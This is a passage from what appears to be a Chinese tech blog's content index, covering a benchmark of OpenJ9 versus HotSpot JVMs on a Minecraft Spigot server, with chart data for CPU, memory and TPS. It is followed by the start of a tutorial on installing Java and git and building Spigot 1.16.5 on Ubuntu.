]\n};\n{% endecharts %}\nOpenj9 jre11在这里发生了意外，在跑图1分钟时内存极速飙升，CPU也到了100%，服务器后台提示overload，个人认为这只是个别现象，但这也说明了Openj9可能出现的不稳定情况。\n跑图时的内存和静态测试唯一不同的是Hotspot jre8，在跑图完成后内存仍然上升，但到了2000M后触发了内存回收，内存下降至1680M以下，这甚至比开服初期的内存还要低。经过反复测试后确认了该现象并不是偶然。\n### CPU占用率\n{% echarts 95% 400 5.4.3 %}\n{\n  title: {\n    text: \"CPU占用率\"\n  },\n  tooltip: {\n    trigger: \"axis\"\n  },\n  legend: {\n    data: [\"Openj9 jre8\", \"Hotspot jre8\", \"Openj9 jre11\", \"Hotspot jre11\"]\n  },\n  grid: {\n    left: \"3%\",\n    right: \"4%\",\n    bottom: \"3%\",\n    containLabel: true\n  },\n  toolbox: {\n    feature: {\n      saveAsImage: {}\n    }\n  },\n  xAxis: {\n    type: \"category\",\n    boundaryGap: false,\n    data: ['0s', '10s', '20s', '30s', '40s', '50s', '1min','1min10s','1min20s','1min30s','1min40s','1min50s','2min','2min10s','2min20s','2min30s','2min40s','2min50s','3min',\n          '3min10s','3min20s','3min30s','3min40s','3min50s','4min','4min10s','4min20s','4min30s','4min40s','4min50s','5min','5min10s','5min20s','5min30s','5min40s','5min50s','6min','6min10s','6min20s','6min30s','6min40s','6min50s','7min','7min10s','7min20s','7min30s','7min40s','7min50s','8min','8min10s','8min20s','8min30s','8min40s','8min50s','9min','9min10s','9min20s','9min30s','9min40s','9min50s','10min','10min10s','10min20s','10min30s','10min40s','10min50s','11min','11min10s','11min20s','11min30s','11min40s','11min50s','12min','12min10s','12min20s','12min30s','12min40s','12min50s','13min','13min10s','13min20s','13min30s','13min40s','13min50s','14min','14min10s','14min20s','14min30s','14min40s','14min50s','15min']\n  },\n  yAxis: {\n    type: \"value\",\n    scale:true\n  },\n  series: [\n    {\n      showSymbol: false,\n      name: \"Openj9 jre8\",\n      type: \"line\",\n      data: [\n35.3,\n18.8, \n86.6, \n31.4, \n20.0, \n29.8, \n80.8, \n93.0, \n84.4, \n89.6, \n91.4, \n83.2, \n82.3, \n79.0, \n81.8, \n78.4, \n80.0, \n76.6, \n73.1, \n49.8, \n15.6, \n16.4, \n14.2, \n12.6, \n13.7, \n11.9, \n14.1, \n12.4, \n16.2, \n10.5, \n24.9, \n13.8, \n13.2, \n11.2, \n12.5, \n12.6, \n13.3, \n12.3, \n11.8, \n11.0, \n12.4, \n11.6, \n11.8, \n11.2, \n11.8, \n11.8, \n14.5, \n10.9, \n13.4, \n14.0, \n11.7, \n13.3, \n13.5, \n11.4, \n13.6, \n12.3,\n17.0, \n14.5, \n15.9, \n14.8, \n20.2, \n11.7,\n13.9, \n12.0, \n13.9, \n10.8, \n11.4, \n13.1, \n12.2, \n10.9, \n13.8, \n10.7, \n10.5, \n11.5, \n9.7, \n12.0, \n12.8, \n10.9, \n10.4, \n10.0, \n13.1, \n13.9, \n9.9, \n9.9, \n9.9, \n10.2, \n9.8,\n9.1,\n9.8, \n9.8, \n14.3, \n11.3, \n11.8, \n12.4, \n14.7, \n10.0\n]\n    },\n    {\n      showSymbol: false,\n      name: \"Hotspot jre8\",\n      type: \"line\",\n      data: [\n        6.8,\n61.7, \n52.3, \n54.8, \n82.9, \n87.1, \n79.2, \n78.7, \n78.8, \n77.8, \n77.1, \n75.8, \n80.2, \n77.1, \n78.3, \n76.0, \n71.8, \n49.3, \n18.0, \n15.2, \n14.0, \n13.5, \n11.7, \n11.4, \n12.3, \n11.8, \n11.2, \n13.2, \n12.1, \n12.8, \n12.4, \n12.5, \n11.6, \n12.2, \n37.7, \n18.0, \n11.5, \n15.2, \n12.8, \n15.1, \n13.6, \n11.6, \n12.1, \n13.9, \n12.6, \n12.8, \n11.6, \n10.8, \n14.4, \n11.2, \n11.6, \n11.9, \n10.1, \n11.6, \n11.4, \n11.1, \n11.2, \n10.5, \n10.2, \n13.0, \n11.0, \n25.2, \n27.9, \n10.3, \n16.0, \n10.8, \n11.7, \n14.4, \n11.6, \n11.8, \n12.2, \n12.8, \n13.4, \n14.5, \n13.6, \n14.4, \n16.0, \n15.9, \n14.9, \n11.6, \n10.3, \n11.2, \n9.7, \n10.8, \n12.9,\n12.1, \n13.0, \n12.3, \n12.1, \n12.3, \n12.2, \n12.1,\n12.7, \n14.6, \n17.2,\n11.9, \n14.4,\n11.4, \n11.0, \n12.3, \n29.9, \n8.9, \n8.3, \n7.4, \n5.7, \n6.3, \n6.7, \n6.1, \n9.1 \n]\n    },\n    {\n      showSymbol: false,\n      name: \"Openj9 jre11\",\n      type: \"line\",\n      data: [\n        7.0,\n74.6,\n29.4,\n90.4,\n61.8, \n100.0, \n99.9,\n99.0,\n78.8, \n79.3, \n78.1, \n78.4, \n81.2, \n80.2, \n81.6, \n79.2, \n76.9, \n81.2, \n26.7, \n16.5, \n15.3, \n15.9, \n13.0, \n12.7, \n16.0, \n18.3, \n18.9, \n14.2, \n15.1, \n18.3, \n13.9, \n14.2, \n13.4, \n12.8, \n13.3, \n14.3, \n12.9, \n15.0, \n13.3, \n12.5, \n14.1, \n14.0, \n13.5, \n12.8, \n12.8, \n14.4, \n14.3, \n22.9, \n12.7, \n13.6, \n12.9, \n12.5, \n12.1, \n12.4, \n12.8, \n13.5, \n15.8, \n12.3, \n11.6, \n13.2, \n12.8, \n16.0, \n13.1, \n13.1, \n13.6, \n13.4, \n12.1, \n13.3, \n11.8, \n13.0, \n14.0, \n13.0, \n13.3, \n13.3, \n14.5, \n13.7, \n13.9, \n18.2,\n13.1,\n12.8, \n14.9, \n13.9, \n12.1, \n11.7, \n12.5, \n11.1, \n11.7, \n12.3, \n11.3, \n13.9, \n11.2, \n13.6, \n13.0, \n11.0, \n11.7 \n]\n    },\n    {\n      showSymbol: false,\n      name: \"Hotspot jre11\",\n      type: \"line\",\n      data: [7.2,\n27.5,\n77,\n87.7,\n99.6,\n95.4,\n91.2,\n91.5,\n82.2,\n81.7,\n80.6,\n76.9,\n79.7,\n79.3,\n75,\n84.6,\n73.9,\n43.1,\n34.7,\n14.3,\n14.4,\n13.4,\n13.2,\n11.8,\n11,\n10.9,\n12.1,\n15.8,\n14.9,\n10.5,\n10.2,\n12.1,\n11.2,\n11,\n10.3,\n10,\n10.9,\n12.8,\n10.8,\n12.8,\n12,\n10.7,\n11.3,\n11.6,\n12.5,\n12.5,\n12.3,\n10,\n16.1,\n10.5,\n10.3,\n12.5,\n11.2,\n13.4,\n10.8,\n11.9,\n14.2,\n11.3,\n17.3,\n15.5,\n10.9,\n11,\n10.8,\n10.5,\n13.4,\n14.1,\n11.8,\n11.9,\n12.7,\n10.6,\n11.9,\n10.8,\n12,\n11.6,\n10.3,\n11.7,\n12.8,\n9.9,\n16.8,\n13.4,\n9.4,\n12.6,\n9.8,\n9.7,\n12.9,\n11.5,\n12,\n10.5,\n9.6,\n13.1,\n13,\n13.4,\n13.8,\n11.4,\n11.4,\n10.7,\n9.9,\n10.2\n]\n    },\n  ]\n};\n{% endecharts %}\n无明显区别。\n## 多插件开服测试\n测试方法：和无插件开服测试相同\n使用插件列表：\n- AdvancedNMotd-9.2.0\n- Boom-1.3.3\n- EastLandLog4jFixer-1.0.4\n- EssentialsX-2.19.0-dev+52-7245e84\n- EssentialsXChat-2.19.0-dev+52-7245e84\n- EssentialsXSpawn-2.19.0-dev+52-7245e84\n- HolographicDisplays-2.4.5\n- HolographicPlaceholders-2.1.2 Stable\n- LimitPillagers-3.0.1\n- MiaoBoard-2.6.0\n- MySkin-3.3\n- NekoMaid-0.2.5\n- PlaceholderAPI-2.10.9\n- PlugManX-2.2.9\n- ProtocolLib-4.5.1\n- spark-1.9.23\n- Uniporter-1.3.3\n- Vault-1.7.3\n- VillagerOptimiser-1.1.5\n使用存档为本人服务器存档，大小约3G，含多个强加载区块\n### CPU占用率\n{% echarts 95% 400 5.4.3 %}\n{\n  title: {\n    text: \"CPU占用率\"\n  },\n  tooltip: {\n    trigger: \"axis\"\n  },\n  legend: {\n    data: [\"Openj9 jre8\", \"Hotspot jre8\", \"Openj9 jre11\", \"Hotspot jre11\"]\n  },\n  grid: {\n    left: \"3%\",\n    right: \"4%\",\n    bottom: \"3%\",\n    containLabel: true\n  },\n  toolbox: {\n    feature: {\n      saveAsImage: {}\n    }\n  },\n  xAxis: {\n    type: \"category\",\n    boundaryGap: false,\n    data: ['0s', '10s', '20s', '30s', '40s', '50s', '1min','1min10s','1min20s','1min30s','1min40s','1min50s','2min','2min10s','2min20s','2min30s','2min40s','2min50s','3min',\n          '3min10s','3min20s','3min30s','3min40s','3min50s','4min','4min10s','4min20s','4min30s','4min40s','4min50s','5min','5min10s','5min20s','5min30s','5min40s','5min50s','6min','6min10s','6min20s','6min30s','6min40s','6min50s','7min','7min10s','7min20s','7min30s','7min40s','7min50s','8min','8min10s','8min20s','8min30s','8min40s','8min50s','9min','9min10s','9min20s','9min30s','9min40s','9min50s','10min','10min10s','10min20s','10min30s','10min40s','10min50s','11min','11min10s','11min20s','11min30s','11min40s','11min50s','12min','12min10s','12min20s','12min30s','12min40s','12min50s','13min','13min10s','13min20s','13min30s','13min40s','13min50s','14min','14min10s','14min20s','14min30s','14min40s','14min50s','15min']\n  },\n  yAxis: {\n    type: \"value\",\n    scale:true\n  },\n  series: [\n    {\n      showSymbol: false,\n      name: \"Openj9 jre8\",\n      type: \"line\",\n      data: [\n        27.3 ,\n99.1 ,\n99.9 ,\n99.8 ,\n99.9 ,\n97.7 ,\n99.7 ,\n99.7 ,\n99.7 ,\n99.5 ,\n99.6 ,\n84.2 ,\n80.9 ,\n81.7 ,\n81.9 ,\n75.9 ,\n77.5 ,\n20.2 ,\n19.1 ,\n17.0 ,\n18.9 ,\n18.6 ,\n26.0 ,\n19.3 ,\n17.7 ,\n17.0 ,\n70.9 ,\n17.4 ,\n18.1 ,\n17.0 ,\n19.2 ,\n18.0 ,\n17.2 ,\n17.0 ,\n15.7 ,\n15.7 ,\n16.8 ,\n15.3 ,\n18.0 ,\n14.8 ,\n15.5 ,\n18.2 ,\n15.2 ,\n15.6 ,\n14.4 ,\n14.9 ,\n32.3 ,\n14.5 ,\n15.0 ,\n15.2 ,\n15.5 ,\n17.8 ,\n17.4 ,\n16.4 ,\n17.2 ,\n29.3 ,\n16.7 ,\n16.0 ,\n16.2 ,\n14.7 ,\n17.2 ,\n13.6 ,\n14.2 ,\n14.1 ,\n15.1 ,\n14.6 ,\n22.4 ,\n13.7 ,\n14.7 ,\n16.3 ,\n16.2 ,\n17.3 ,\n15.3 ,\n13.6 ,\n16.5 ,\n13.8 ,\n13.9 ,\n14.4 ,\n15.4 ,\n16.5 ,\n15.1 ,\n17.1 ,\n15.0 ,\n15.8 ,\n13.0 ,\n15.2 ,\n18.1 ,\n15.9 ,\n15.1 ,\n15.3 ,\n13.9 ,\n13.3 ,\n13.4 ,\n14.0 ,\n14.9 ,\n18.3 ,\n14.6 ,\n15.2 ,\n14.6 ,\n13.0 \n\n]\n    },\n    {\n      showSymbol: false,\n      name: \"Hotspot jre8\",\n      type: \"line\",\n      data: [\n        0.7 ,\n54.5 ,\n99.2 ,\n98.3 ,\n99.0 ,\n96.4 ,\n97.2 ,\n93.2 ,\n90.0 ,\n82.7 ,\n76.1 ,\n79.7 ,\n76.3 ,\n39.9 ,\n19.0 ,\n18.6 ,\n17.0 ,\n17.6 ,\n16.5 ,\n16.7 ,\n19.3 ,\n15.6 ,\n15.7 ,\n14.3 ,\n18.1 ,\n42.2 ,\n15.7 ,\n15.9 ,\n17.9 ,\n15.3 ,\n15.4 ,\n14.9 ,\n16.6 ,\n20.0 ,\n14.6 ,\n17.7 ,\n17.4 ,\n16.0 ,\n15.6 ,\n16.2 ,\n16.1 ,\n17.6 ,\n19.8 ,\n18.2 ,\n18.8 ,\n21.9 ,\n16.7 ,\n16.3 ,\n13.1 ,\n14.0 ,\n14.6 ,\n13.9 ,\n13.7 ,\n12.8 ,\n13.1 ,\n13.4 ,\n14.3 ,\n14.0 ,\n16.5 ,\n15.8 ,\n15.7 ,\n18.7 ,\n16.5 ,\n18.0 ,\n15.7 ,\n19.0 ,\n14.9 ,\n13.9 ,\n13.0 ,\n15.3 ,\n14.3 ,\n14.1 ,\n15.2 ,\n13.8 ,\n13.0 ,\n13.1 ,\n14.2 ,\n15.7 ,\n14.0 ,\n15.6 ,\n19.3 ,\n16.4 ,\n14.3 ,\n13.7 ,\n12.8 ,\n20.6 ,\n14.4 ,\n14.9 ,\n15.5 ,\n14.2 ,\n14.0 ,\n13.6 \n\n]\n    },\n    {\n      showSymbol: false,\n      name: \"Openj9 jre11\",\n      type: \"line\",\n      data: [\n        0.9 ,\n48.5 ,\n99.3 ,\n99.7 ,\n99.8 ,\n98.4 ,\n78.7 ,\n97.6 ,\n99.9 ,\n99.9 ,\n99.7 ,\n99.1 ,\n99.5 ,\n85.1 ,\n78.7 ,\n81.5 ,\n79.2 ,\n77.1 ,\n89.2 ,\n77.4 ,\n73.7 ,\n74.9 ,\n81.6 ,\n40.2 ,\n20.1 ,\n19.1 ,\n20.5 ,\n61.6 ,\n48.4 ,\n20.5 ,\n18.7 ,\n18.2 ,\n19.2 ,\n20.9 ,\n16.4 ,\n16.3 ,\n15.2 ,\n18.7 ,\n17.9 ,\n15.2 ,\n17.5 ,\n16.8 ,\n16.5 ,\n19.8 ,\n20.7 ,\n17.0 ,\n19.0 ,\n29.9 ,\n15.0 ,\n16.6 ,\n16.1 ,\n15.7 ,\n18.1 ,\n15.9 ,\n18.7 ,\n16.6 ,\n16.1 ,\n16.1 ,\n15.3 ,\n23.4 ,\n17.4 ,\n18.8 ,\n19.0 ,\n15.5 ,\n18.8 ,\n15.9 ,\n31.0 ,\n21.4 ,\n16.0 ,\n15.2 ,\n15.6 ,\n15.3 ,\n16.5 ,\n15.8 ,\n15.8 ,\n15.7 ,\n16.5 ,\n15.2 ,\n15.3 ,\n16.2 ,\n15.8 ,\n17.1 ,\n16.9 ,\n17.3 ,\n15.7 ,\n15.1 ,\n16.9 ,\n19.0 ,\n14.8 ,\n15.0 ,\n14.2 ,\n14.5 ,\n16.4\n]\n    },\n    {\n      showSymbol: false,\n      name: \"Hotspot jre11\",\n      type: \"line\",\n      data: [\n        0.9 ,\n38.4 ,\n98.7 ,\n99.0 ,\n99.5 ,\n98.3 ,\n99.3 ,\n99.2 ,\n97.1 ,\n95.5 ,\n86.5 ,\n83.7 ,\n83.5 ,\n77.5 ,\n51.2 ,\n20.1 ,\n20.0 ,\n18.9 ,\n16.7 ,\n16.6 ,\n15.7 ,\n16.4 ,\n27.8 ,\n18.7 ,\n22.7 ,\n40.2 ,\n18.5 ,\n18.2 ,\n16.3 ,\n17.9 ,\n17.0 ,\n17.0 ,\n20.5 ,\n15.6 ,\n15.6 ,\n14.5 ,\n14.5 ,\n13.1 ,\n15.3 ,\n14.1 ,\n14.9 ,\n13.7 ,\n14.2 ,\n15.0 ,\n16.1 ,\n17.8 ,\n14.9 ,\n14.6 ,\n14.8 ,\n13.5 ,\n13.7 ,\n17.5 ,\n13.7 ,\n13.3 ,\n13.0 ,\n13.9 ,\n14.0 ,\n12.5 ,\n12.9 ,\n12.8 ,\n13.9 ,\n12.0 ,\n15.1 ,\n15.8 ,\n12.0 ,\n16.8 ,\n12.7 ,\n14.7 ,\n14.0 ,\n13.3 ,\n16.0 ,\n14.6 ,\n11.8 ,\n15.2 ,\n16.6 ,\n12.5 ,\n13.3 ,\n12.8 ,\n12.5 ,\n13.5 ,\n15.8 ,\n16.3 ,\n14.5 ,\n15.1 ,\n16.2 ,\n19.7 ,\n13.0 ,\n12.9 ,\n13.3 ,\n13.9 ,\n16.0 ,\n12.7 ,\n12.5 ,\n14.6 ,\n16.6 ,\n14.7 ,\n14.1 ,\n13.8 ,\n14.9 \n]\n    },\n  ]\n};\n{% endecharts %}\nOpenj9 jre11表现不佳，其余占用率相近。\n### 内存占用\n{% echarts 95% 400 5.4.3 %}\n{\n  title: {\n    text: \"内存占用\"\n  },\n  tooltip: {\n    trigger: \"axis\"\n  },\n  legend: {\n    data: [\"Openj9 jre8\", \"Hotspot jre8\", \"Openj9 jre11\", \"Hotspot jre11\"]\n  },\n  grid: {\n    left: \"3%\",\n    right: \"4%\",\n    bottom: \"3%\",\n    containLabel: true\n  },\n  toolbox: {\n    feature: {\n      saveAsImage: {}\n    }\n  },\n  xAxis: {\n    type: \"category\",\n    boundaryGap: false,\n    data: ['0s', '10s', '20s', '30s', '40s', '50s', '1min','1min10s','1min20s','1min30s','1min40s','1min50s','2min','2min10s','2min20s','2min30s','2min40s','2min50s','3min',\n          '3min10s','3min20s','3min30s','3min40s','3min50s','4min','4min10s','4min20s','4min30s','4min40s','4min50s','5min','5min10s','5min20s','5min30s','5min40s','5min50s','6min','6min10s','6min20s','6min30s','6min40s','6min50s','7min','7min10s','7min20s','7min30s','7min40s','7min50s','8min','8min10s','8min20s','8min30s','8min40s','8min50s','9min','9min10s','9min20s','9min30s','9min40s','9min50s','10min','10min10s','10min20s','10min30s','10min40s','10min50s','11min','11min10s','11min20s','11min30s','11min40s','11min50s','12min','12min10s','12min20s','12min30s','12min40s','12min50s','13min','13min10s','13min20s','13min30s','13min40s','13min50s','14min','14min10s','14min20s','14min30s','14min40s','14min50s','15min']\n  },\n  yAxis: {\n    type: \"value\",\n    scale:true\n  },\n  series: [\n    {\n      showSymbol: false,\n      name: \"Openj9 jre8\",\n      type: \"line\",\n      data: [\n        515,\n1074,\n1235,\n1286,\n1375,\n1433,\n1460,\n1451,\n1454,\n1465,\n1460,\n1463,\n1449,\n1468,\n1456,\n1470,\n1470,\n1466,\n1468,\n1467,\n1470,\n1468,\n1471,\n1470,\n1472,\n1475,\n1494,\n1478,\n1475,\n1474,\n1473,\n1474,\n1475,\n1477,\n1476,\n1475,\n1475,\n1477,\n1477,\n1481,\n1475,\n1471,\n1471,\n1477,\n1472,\n1471,\n1471,\n1472,\n1474,\n1472,\n1472,\n1472,\n1472,\n1466,\n1465,\n1466,\n1466,\n1466,\n1466,\n1466,\n1466,\n1466,\n1467,\n1466,\n1467,\n1469,\n1465,\n1465,\n1466,\n1466,\n1468,\n1468,\n1468,\n1468,\n1468,\n1468,\n1467,\n1468,\n1461,\n1461,\n1461,\n1461,\n1462,\n1461,\n1461,\n1462,\n1465,\n1462,\n1462,\n1462,\n1463,\n1456,\n1457,\n1456,\n1457,\n1457,\n1457,\n1457,\n1465,\n1457\n]\n    },\n    {\n      showSymbol: false,\n      name: \"Hotspot jre8\",\n      type: \"line\",\n      data: [\n        473,\n654,\n1282,\n1453,\n1522,\n1653,\n1649,\n1654,\n1661,\n1689,\n1700,\n1710,\n1712,\n1721,\n1721,\n1722,\n1721,\n1721,\n1721,\n1722,\n1722,\n1724,\n1724,\n1724,\n1725,\n1737,\n1740,\n1740,\n1739,\n1740,\n1740,\n1741,\n1739,\n1740,\n1741,\n1741,\n1741,\n1742,\n1741,\n1742,\n1743,\n1742,\n1743,\n1744,\n1743,\n1745,\n1745,\n1746,\n1746,\n1746,\n1746,\n1746,\n1745,\n1746,\n1746,\n1746,\n1745,\n1745,\n1745,\n1745,\n1746,\n1746,\n1746,\n1746,\n1746,\n1746,\n1747,\n1747,\n1747,\n1747,\n1748,\n1748,\n1748,\n1748,\n1748,\n1748,\n1748,\n1749,\n1748,\n1749,\n1748,\n1749,\n1748,\n1749,\n1749,\n1749,\n1750,\n1749,\n1750,\n1750,\n1750,\n1751\n]\n    },\n    {\n      showSymbol: false,\n      name: \"Openj9 jre11\",\n      type: \"line\",\n      data: [\n        473,\n686,\n1210,\n1319,\n1406,\n1505,\n1575,\n1610,\n1622,\n1643,\n1631,\n1633,\n1638,\n1635,\n1633,\n1633,\n1636,\n1641,\n1640,\n1654,\n1662,\n1659,\n1770,\n1665,\n1664,\n1672,\n1666,\n1720,\n1664,\n1664,\n1665,\n1665,\n1668,\n1683,\n1666,\n1669,\n1660,\n1665,\n1666,\n1659,\n1659,\n1663,\n1659,\n1659,\n1660,\n1656,\n1655,\n1672,\n1657,\n1656,\n1659,\n1659,\n1661,\n1655,\n1688,\n1655,\n1656,\n1656,\n1656,\n1655,\n1656,\n1651,\n1654,\n1654,\n1654,\n1653,\n1652,\n1654,\n1654,\n1648,\n1649,\n1654,\n1648,\n1652,\n1649,\n1648,\n1649,\n1642,\n1642,\n1643,\n1642,\n1642,\n1642,\n1644,\n1638,\n1641,\n1641,\n1641,\n1641,\n1641,\n1641,\n1645,\n1635\n]\n    },\n    {\n      showSymbol: false,\n      name: \"Hotspot jre11\",\n      type: \"line\",\n      data: [\n        472,\n535,\n979,\n1474,\n1708,\n1866,\n1889,\n1893,\n1910,\n1914,\n1917,\n1918,\n1920,\n1923,\n1935,\n1936,\n1937,\n1937,\n1938,\n1938,\n1939,\n1938,\n1943,\n1940,\n1941,\n1942,\n1945,\n1945,\n1946,\n1946,\n1947,\n1948,\n1948,\n1948,\n1950,\n1950,\n1950,\n1950,\n1950,\n1950,\n1951,\n1951,\n1950,\n1951,\n1952,\n1951,\n1953,\n1953,\n1953,\n1953,\n1953,\n1952,\n1952,\n1952,\n1952,\n1952,\n1952,\n1953,\n1953,\n1953,\n1952,\n1953,\n1953,\n1953,\n1954,\n1953,\n1954,\n1954,\n1954,\n1954,\n1955,\n1955,\n1954,\n1954,\n1954,\n1954,\n1954,\n1954,\n1954,\n1954,\n1954,\n1954,\n1955,\n1955,\n1955,\n1954,\n1955,\n1955,\n1955,\n1955,\n1955,\n1955,\n1956,\n1956,\n1956,\n1956,\n1956,\n1956,\n1957\n]\n    },\n  ]\n};\n{% endecharts %}\n和无插件开服测试结果相同，Openj9的内存依然非常低。\n### TPS\n{% echarts 95% 400 5.4.3 %}\noption = {\n  title: {\n    text: \"TPS\"\n  },\n  tooltip: {\n    trigger: \"axis\"\n  },\n  legend: {\n    data: [\"Openj9 jre8\", \"Hotspot jre8\", \"Openj9 jre11\", \"Hotspot jre11\"]\n  },\n  grid: {\n    left: \"3%\",\n    right: \"4%\",\n    bottom: \"3%\",\n    containLabel: true\n  },\n  toolbox: {\n    feature: {\n      saveAsImage: {}\n    }\n  },\n  xAxis: {\n    type: \"category\",\n    boundaryGap: false,\n    data: [\"0s\",\n      \"5s\",\n      \"10s\",\n      \"15s\",\n      \"20s\",\n      \"25s\",\n      \"30s\",\n      \"35s\",\n      \"40s\",\n      \"45s\",\n      \"50s\",\n      \"55s\",\n      \"1min\",\n      \"1min5s\",\n      \"1min10s\",\n      \"1min15s\",\n      \"1min20s\",\n      \"1min25s\",\n      \"1min30s\",\n      \"1min35s\",\n      \"1min40s\",\n      \"1min45s\",\n      \"1min50s\",\n      \"1min55s\",\n      \"2min\",\n      \"2min5s\",\n      \"2min10s\",\n      \"2min15s\",\n      \"2min20s\",\n      \"2min25s\",\n      \"2min30s\",\n      \"2min35s\",\n      \"2min40s\",\n      \"2min45s\",\n      \"2min50s\",\n      \"2min55s\",\n      \"3min\",\n      \"3min5s\",\n      \"3min10s\",\n      \"3min15s\",\n      \"3min20s\",\n      \"3min25s\",\n      \"3min30s\",\n      \"3min35s\",\n      \"3min40s\",\n      \"3min45s\",\n      \"3min50s\",\n      \"3min55s\",\n      \"4min\",\n      \"4min5s\",\n      \"4min10s\",\n      \"4min15s\",\n      \"4min20s\",\n      \"4min25s\",\n      \"4min30s\",\n      \"4min35s\",\n      \"4min40s\",\n      \"4min45s\",\n      \"4min50s\",\n      \"4min55s\",\n      \"5min\"]\n  },\n  yAxis: {\n    type: \"value\",\n    scale:true\n  },\n  series: [\n    {\n      showSymbol: false,\n      name: \"Openj9 jre8\",\n      type: \"line\",\n      data: [null,null,null,null,null,null,\n      null,null,null,null,null,20,\n      20,20,20,20,20,20,20,\n      20,20,10.43,16.17,17.27,17.61,\n      18.26,18.26,20,20,20,20,\n      20,20,20,20,20,20,\n      20,20,20,20,20,20,20,19.7,19.7,19.7,\n      20,20,20,20,20,19.47,19.47,19.47,19.47,19.47,19.47,20,\n      20,20,20,20,20\n]\n    },\n    {\n      showSymbol: false,\n      name: \"Hotspot jre8\",\n      type: \"line\",\n      data: [null,null,null,null,null,null,\n      null,null,null,null,20,20,\n      20,20,20,20,20,20,\n      15.24,16.19,17.28,18.1,18.27,20,\n      20,20,20,20,20,20,\n      20,20,20,20,20,20,\n      20,20,20,20,20,20,\n      20,20,20,20,20,20,\n      19.91,19.91,19.91,19.91,19.91,19.91,\n      20,20,20,20,20,20,20\n        ]\n    },\n    {\n      showSymbol: false,\n      name: \"Openj9 jre11\",\n      type: \"line\",\n      data: [null,null,null,null,null,null,\n      null,null,null,null,null,null,\n      null,20,20,20,20,20,\n      20,20,20,20,10.44,15.22,\n      16.81,17.61,18.09,18.26,20,20,\n      20,20,20,20,20,20,\n      20,20,20,20,20,20,\n      20,20,20,20,20,20,\n      20,20,20,20,20,19.02,\n      19.11,19.11,19.11,19.11,19.11,20,20\n]\n    },\n    {\n      showSymbol: false,\n      name: \"Hotspot jre11\",\n      type: \"line\",\n      data: [null,null,null,null,null,null,\n      null,null,null,20,20,20,\n      20,20,20,20,20,20,\n      10.49,15.24,16.83,17.62,18.1,18.27,\n      20,20,20,20,20,20,\n      20,20,20,20,20,20,\n      20,20,20,20,20,20,\n      20,20,20,20,20,20,\n      20,19.99,20,20,20,20,\n      20,20,20,20,20,20,20\n]\n    },\n  ]\n};\n{% endecharts %}\n四个版本TPS均会下降，但由于Hotspot启动速度约是Openj9两倍，所以TPS下降时间点也略微提前。\n## 总结\nOpenj9相比于Hotspot性能会有略微的损失，具体表现为开服速度慢约两倍，CPU占用率会更高。但由此带来的是内存的大量降低。如果在TPS上并没有过大的压力但是内存紧俏的情况下建议还是 采用Openj9的虚拟机。\n对于1.16版本的Minecraft，如果没有插件的特殊要求，建议使用java8而非java11。\n","tags":["Minecraft","spigot"],"categories":["计软杂谈"]},{"title":"Ubuntu下安装spigot搭建Minecraft服务器","url":"/reimu-lighthouse/20220701/minecraft-server-install/","content":"自己的服务器搭建时间也有一年了，在此记录一下搭建的过程，以防之后忘记。\n- 操作系统：Ubuntu 16.04 LTS\n- Minecraft版本：1.16.5\n- Java版本1.8\n> 1.17以上mc需要java17及以上版本，部分1.13-1.16插件对于java也有特殊要求，请自行确定安装版本\n## 安装java\n由于Minecraft高版本特有的渣优化，渣机建议使用openj9的JVM，能降低内存的占用，但兼容性和稳定性可能会存在一定的问题\n如果服务器质量较好，则建议选择hotspot的JVM，能提供更加稳定的服务\n### hotspot版本\n由于openjdk默认使用hotspot，所以直接进行安装即可\n```bash\nsudo apt install openjdk-8-jdk\n```\n### openj9版本\n可以去IBM Semeru Runtime官网下载符合对应机器和系统的jre或jdk\nhttps://developer.ibm.com/languages/java/semeru-runtimes/downloads/\n如果下载速度较慢，可以选择清华镜像进行下载\nhttps://mirrors.tuna.tsinghua.edu.cn/github-release/ibmruntimes/\n本人下载的版本为\nhttps://mirrors.tuna.tsinghua.edu.cn/github-release/ibmruntimes/semeru8-binaries/LatestRelease/ibm-semeru-open-jre_x64_linux_8u332b09_openj9-0.32.0.tar.gz\n下载到的tar包解压后放入服务器任意位置，并记住bin文件夹下java对应的路径\n本人的java文件路径为/var/jre/jdk8u332-b09-jre/bin/java\n运行以下命令进行软连接，注意最后的路径为java文件的路径\n```bash\nsudo update-alternatives --install /usr/bin/java java /var/jre/jdk8u332-b09-jre/bin/java 200\n```\n运行成功提示\n```text\nupdate-alternatives: using /var/jre/jdk8u332-b09-jre/bin/java to provide /usr/bin/java (java) in auto mode\n```\n运行以下命令测试java是否成功安装\n```bash\njava -version\n```\n如果出现了以下报错\n```bash\nroot@Ubuntu:~# java -version\n-bash: /usr/bin/java: Permission denied\n```\n此时说明解压后的文件没有运行权限，为文件增加权限\n```bash\nsudo chmod 755 -R /var/jre/jdk8u332-b09-jre\n```\n再次运行，如果出现了java版本则说明安装成功\n```bash\nroot@Ubuntu:~# java -version\nopenjdk version \"1.8.0_332\"\nIBM Semeru Runtime Open Edition (build 1.8.0_332-b09)\nEclipse OpenJ9 VM (build openj9-0.32.0, JRE 1.8.0 Linux amd64-64-Bit Compressed References 20220422_370 (JIT enabled, AOT enabled)\nOpenJ9   - 9a84ec34e\nOMR      - ab24b6666\nJCL      - 0b8b8af39a based on jdk8u332-b09)\n```\n## 安装git\n运行如下命令\n```bash\nsudo apt-get update\nsudo apt install git\ngit --version\n```\n如果出现了git版本则说明安装成功\n```bash\nroot@Ubuntu:~# git --version\ngit version 2.7.4\n```\n## 构建spigot\n由于log4j的漏洞存在，所以非常不建议使用2021-12月以前构建出的spigot服务器jar包\n进入spigot官网下载BuildTools.jar\nhttps://hub.spigotmc.org/jenkins/job/BuildTools/\n运行如下代码进行构建\n```bash\njava -jar BuildTools.jar --rev 1.16.5\n```\n如果卡在如下环节，可以将手动进入该网站下载server.jar，重命名为minecraft_server.\\[对应版本号\\].jar后放在work文件夹下，并重新构建\n```text\nStarting download of https://launcher.mojang.com/v1/objects/1b557e7b033b583cd9f66746b7a9ab1ec1673ced/server.jar\n```\n如果一切顺利，则构建成功后会显示如下信息，此时除了spigot-\\[对应版本号\\].jar外其他文件均可删除\n```text\n[INFO] ------------------------------------------------------------------------\n[INFO] Reactor Summary:\n[INFO] \n[INFO] Spigot-API 1.16.5-R0.1-SNAPSHOT .................... SUCCESS [ 12.795 s]\n[INFO] Spigot-Parent dev-SNAPSHOT ......................... SUCCESS [  0.018 s]\n[INFO] Spigot 1.16.5-R0.1-SNAPSHOT ........................ SUCCESS [ 46.675 s]\n[INFO] ------------------------------------------------------------------------\n[INFO] BUILD SUCCESS\n[INFO] ------------------------------------------------------------------------\n[INFO] Total time:  59.643 s\n[INFO] 